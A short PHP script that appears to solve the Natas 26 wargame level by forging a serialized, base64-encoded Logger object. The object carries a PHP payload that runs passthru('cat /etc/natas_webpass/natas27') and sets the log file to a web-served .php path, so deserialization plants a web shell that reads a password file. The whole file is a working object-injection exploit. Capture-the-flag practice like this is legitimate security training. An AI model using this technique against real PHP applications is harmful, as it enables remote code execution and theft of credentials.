<?php

class Logger {
	private $logFile;
	private $exitMsg;

	function __construct(){
	       $this->exitMsg= "<?php echo passthru('cat /etc/natas_webpass/natas27'); ?>";
	       $this->logFile= "/var/www/natas/natas26/img/natas26_myseshpwd.php";
	}

}

$logger = new Logger();
echo serialize($logger);
echo base64_encode(serialize($logger));
php
